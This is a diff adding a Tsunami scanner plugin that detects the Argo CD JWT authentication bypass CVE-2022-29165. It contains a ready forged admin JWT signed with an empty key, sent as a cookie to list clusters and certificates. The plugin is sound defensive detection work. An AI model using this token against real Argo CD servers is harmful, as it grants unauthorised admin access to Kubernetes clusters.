@@ -1,0 +1,154 @@
+# proto-file: github.com/google/tsunami-security-scanner-plugins/templated/templateddetector/proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "ArgoCD_CVE_2022_29165"
+  author: "JamesFoxxx"
+  version: "1.0"
+  description: "Detects Argo CD improper JWT validation authentication bypass when anonymous access is enabled (CVE-2022-29165)."
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "VULNERABLE_ARGOCD_API_SERVER"
+  }
+  severity: CRITICAL
+  title: "Argo CD API server Exposed"
+  description: "Argo CD API server is vulnerable to CVE-2022-29165. It allows attackers to access kubernetes clusters. Attackers can change parameters of clusters and possibly compromise it."
+  recommendation: "Patched versions are 2.1.15, and 2.3.4, and 2.2.9, and 2.1.15. Please update Argo CD to these versions and higher."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2022-29165"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "check_argocd_version"
+  action_phase: ACTION_PHASE_FINGERPRINT
+  http_request: {
+    method: GET
+    uri: "/api/version"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { header: { name: "Content-Type" } contains: "application/json" },
+          { body: {} contains: "\"Version\":" },
+          { body: {} contains: "\"KustomizeVersion\":" },
+          { body: {} contains: "\"HelmVersion\":" },
+          { body: {} contains: "\"KubectlVersion\":" }
+        ]
+      }
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "verify_unauthenticated_rbac_denied"
+  http_request: {
+    method: GET
+    uri: [
+      "/api/v1/certificates",
+      "/api/v1/clusters"
+    ]
+    response: {
+      expect_all: {
+        conditions: [
+          { header: { name: "Content-Type" } contains: "application/json" },
+          { body: {} contains: "\"code\":7" }
+        ]
+      }
+      extract_any: {
+        patterns: [
+          {
+            variable_name: "rbac_denied_resource"
+            regexp: "permission denied:\\s*(certificates,\\s*get)"
+            from_body: {}
+          },
+          {
+            variable_name: "rbac_denied_resource"
+            regexp: "permission denied:\\s*(clusters,\\s*get)"
+            from_body: {}
+          }
+        ]
+      }
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "verify_forged_jwt_admin_bypass"
+  http_request: {
+    method: GET
+    uri: [
+      "/api/v1/certificates",
+      "/api/v1/clusters"
+    ]
+    headers: [
+      { name: "Cookie" value: "argocd.token={{ forged_admin_jwt }}" }
+    ]
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { header: { name: "Content-Type" } contains: "application/json" },
+          { body: {} contains: "\"metadata\":" }
+        ]
+      }
+      extract_any: {
+        patterns: [
+          {
+            variable_name: "argocd_admin_resource"
+            regexp: "\"items\"\\s*:\\s*\\[\\{[^\\]]*\"serverName\"\\s*:\\s*\"([^\"]+)\"[^\\]]*\"certType\"\\s*:\\s*\"[^\"]+\"[^\\]]*\"certInfo\"\\s*:\\s*\"[^\"]+\""
+            from_body: {}
+          },
+          {
+            variable_name: "argocd_admin_resource"
+            regexp: "\"items\"\\s*:\\s*\\[\\{[^\\]]*\"server\"\\s*:\\s*\"(https?://[^\"]+)\"[^\\]]*\"connectionState\"\\s*:\\s*\\{"
+            from_body: {}
+          }
+        ]
+      }
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  variables: [
+    # Clean-room HS256 JWT {"sub":"admin"} signed with empty HMAC key "".
+    {
+      name: "forged_admin_jwt"
+      value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.TGGTTHuuGpEU8WgobXxkrBtW3NiR3dgw5LR-1DEW3BQ"
+    }
+  ]
+  actions: [
+    "check_argocd_version",
+    "verify_unauthenticated_rbac_denied",
+    "verify_forged_jwt_admin_bypass"
+  ]
+}
